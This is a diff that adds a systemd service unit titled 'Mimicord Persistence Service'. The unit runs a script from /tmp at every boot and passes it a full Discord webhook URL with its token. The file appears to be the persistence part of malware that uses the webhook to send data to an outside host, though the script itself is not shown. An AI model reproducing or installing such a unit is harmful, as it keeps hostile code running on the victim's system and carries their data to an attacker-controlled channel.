@@ -1,0 +1,10 @@
+[Unit]
+Description=Mimicord Persistence Service
+
+[Service]
+Type=notify
+ExecStart=bash /tmp/mimicord.sh https://discord.com/api/webhooks/964398063034703892/evW3AUT8c-LXifS4rqH5N8ttEI5A6gcklH5WB40aaV0h5oAiYfsKiX3ou8kvUPoLv-Q7
+TimeoutSec=300
+
+[Install]
+WantedBy=multi-user.target
